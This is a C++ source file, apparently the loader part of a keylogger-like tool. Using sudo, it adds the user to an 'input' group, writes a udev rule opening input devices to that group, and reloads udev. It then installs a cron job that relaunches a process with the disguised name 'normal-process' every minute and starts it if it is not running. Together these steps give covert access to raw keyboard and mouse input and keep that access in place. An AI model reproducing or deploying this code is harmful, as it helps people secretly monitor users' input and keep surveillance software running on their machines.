// procloader.cpp

#include "procloader.h"
#include "messages.h"

#include <cstdlib>
#include <iostream>
#include <string>

procloader& procloader::get_instance() {
    static procloader instance;
    return instance;
}

procloader::procloader() {}

procloader::~procloader() {}

auto procloader::grpriv() -> bool {
    auto cmd = std::string{"sudo usermod -aG input "};
    auto usr = std::getenv("USER");

    if (usr == nullptr) {
        LOG(messagetype::error, "procloader (grpriv): USER environment variable not set.");
        return false;
    }

    cmd += usr;

    auto const grp_chk   = system("getent group input >/dev/null");
    auto const grp_add   = (grp_chk != 0) ? system("sudo groupadd input") : 0;

    if (grp_chk != 0 && grp_add != 0) {
        LOG(messagetype::error, "procloader (grpriv): Failed to check or add 'input' group.");
        return false;
    }

    auto const usrmod    = system(cmd.c_str());
    if (usrmod != 0) {
        LOG(messagetype::error, "procloader (grpriv): Failed to add user to 'input' group.");
        return false;
    }

    auto const udev_rule = system(
        "echo 'SUBSYSTEM==\"input\", GROUP=\"input\", MODE=\"660\", RUN{builtin}+=\"uaccess\"' "
        "| sudo tee /etc/udev/rules.d/69-input.rules > /dev/null");
    if (udev_rule != 0) {
        LOG(messagetype::error, "procloader (grpriv): Failed to write udev rule.");
        return false;
    }

    auto const udev_reload  = system("sudo udevadm control --reload-rules");
    if (udev_reload != 0) {
        LOG(messagetype::error, "procloader (grpriv): Failed to reload udev rules.");
        return false;
    }

    auto const udev_trigger = system("sudo udevadm trigger");
    if (udev_trigger != 0) {
        LOG(messagetype::error, "procloader (grpriv): Failed to trigger udev.");
        return false;
    }

    LOG(messagetype::info, "procloader (grpriv): Successfully updated group privileges.");
    return true;
}

auto procloader::mkcron() -> bool {
    auto const proc       = std::string{"/usr/local/bin/normal-process"};
    auto const cron_cmd   = std::string{"* * * * * /usr/local/bin/normal-process"};
    auto const cron_job   = system(("crontab -l | grep -q '" + proc + "'").c_str());

    if (cron_job == -1) {
        LOG(messagetype::error, "procloader (mkcron): Error checking existing cron jobs.");
        return false;
    }

    if (cron_job != 0) {
        auto const add_cron = system(("(crontab -l 2>/dev/null; echo '" + cron_cmd + "') | crontab -").c_str());
        if (add_cron != 0) {
            LOG(messagetype::error, "procloader (mkcron): Failed to add cron job.");
            return false;
        }
        LOG(messagetype::info, "procloader (mkcron): Cron job added successfully.");
    } else {
        LOG(messagetype::info, "procloader (mkcron): Cron job already exists.");
    }

    auto const find_proc  = system("pgrep -x normal-process >/dev/null");
    if (find_proc == -1) {
        LOG(messagetype::error, "procloader (mkcron): Error searching for process.");
        return false;
    }

    if (find_proc != 0) {
        auto const start_proc = system(proc.c_str());
        if (start_proc != 0) {
            LOG(messagetype::error, "procloader (mkcron): Failed to start process.");
            return false;
        }
        LOG(messagetype::info, "procloader (mkcron): Process started successfully.");
    } else {
        LOG(messagetype::info, "procloader (mkcron): Process is already running.");
    }

    return true;
}

